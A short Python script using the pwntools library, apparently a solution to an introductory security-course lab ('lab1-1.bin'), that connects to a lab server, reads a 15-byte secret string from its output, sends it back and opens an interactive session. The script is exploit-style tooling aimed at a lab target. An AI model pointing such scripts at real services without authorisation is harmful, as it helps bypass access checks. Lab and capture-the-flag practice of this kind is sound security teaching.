from pwn import *

# Create Process Object
# p = process("./lab1-1.bin")
p = remote("csc748.hostbin.org", 7011)

# Read until the Second Newline Char
p.readuntil(b"\n\n")

# Read 15 bytes of Secret String
s = p.read(15)

# Print Secret String 
print(f"string is: {s}")

# Send Secret String to process
p.sendline(s)

# Start an interactive session
p.interactive()



